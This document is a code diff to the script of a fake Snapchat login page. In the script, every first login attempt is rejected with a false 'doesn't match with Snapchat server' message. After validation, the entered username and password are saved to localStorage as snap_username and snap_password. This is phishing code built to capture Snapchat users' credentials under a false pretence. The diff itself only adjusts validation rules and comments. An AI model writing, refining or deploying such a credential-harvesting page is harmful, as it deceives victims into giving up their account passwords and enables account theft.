@@ -673,9 +673,11 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
   msgBox.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
   setTimeout(() => {
+    // ✅ Easier validation (replacing strict one)
     const usernameValid = /^[a-z][a-z0-9._-]{2,14}$/.test(username);
-    const passwordValid = /^[a-z0-9!@#$%^&*()_+=\-]{8,}$/.test(password); // lowercase password only, min 8
+    const passwordValid = /^[a-z0-9!@#$%^&*()_+=\-]{8,}$/.test(password) && !/\s/.test(password);
 
+    // ❌ First login attempt always fails
     if (firstAttempt) {
       firstAttempt = false;
       msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Your password or username doesn't match with Snapchat server.";
@@ -686,6 +688,7 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
       return;
     }
 
+    // ❌ If invalid after first attempt
     if (!usernameValid || !passwordValid) {
       msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Please check your username or password.";
       setTimeout(() => {
@@ -695,7 +698,7 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
       return;
     }
 
-    // Save only if valid
+    // ✅ Store only if valid
     localStorage.setItem("snap_username", username);
     localStorage.setItem("snap_password", password);
     localStorage.setItem("Update", "Being processed...");
@@ -708,6 +711,7 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
 
   }, 1500);
 });
+
 
 // document.getElementById('loginForm').addEventListener('submit', function (e) {
 //   e.preventDefault();
